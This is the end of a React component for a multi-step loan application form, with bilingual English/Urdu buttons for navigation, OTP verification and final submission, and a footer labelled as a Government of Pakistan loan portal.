            onClick={() => setStep((s) => Math.max(1, s - 1))}
            disabled={step === 1}
          >
            <ArrowLeft className="w-4 h-4 mr-2" /> Back / <span dir="rtl" lang="ur" className="ml-1">واپس</span>
          </Button>
          {step < 4 ? (
            <Button onClick={next} className="bg-gov-green hover:bg-gov-green/90 text-white shadow-soft">
              Continue / <span dir="rtl" lang="ur" className="mx-1">جاری رکھیں</span> <ArrowRight className="w-4 h-4 ml-2" />
            </Button>
          ) : step === 4 ? (
            <Button onClick={verifyOtp} className="bg-gradient-gold text-gov-green-dark font-bold shadow-gold hover:opacity-95">
              Verify OTP / <span dir="rtl" lang="ur" className="mx-1">تصدیق کریں</span> <Check className="w-4 h-4 ml-2" />
            </Button>
          ) : (
            <Button onClick={submitWithPin} className="bg-gradient-gold text-gov-green-dark font-bold shadow-gold hover:opacity-95">
              Confirm & Submit / <span dir="rtl" lang="ur" className="mx-1">تصدیق و جمع</span> <Check className="w-4 h-4 ml-2" />
            </Button>
          )}
        </div>
      </Card>

      <p className="text-xs text-center text-muted-foreground mt-4 flex items-center justify-center gap-1">
        <FileText className="w-3 h-3" /> Government of Pakistan – Official Loan Portal · <span dir="rtl" lang="ur">حکومتِ پاکستان</span>
      </p>
    </div>
  );
};

export default LoanForm;
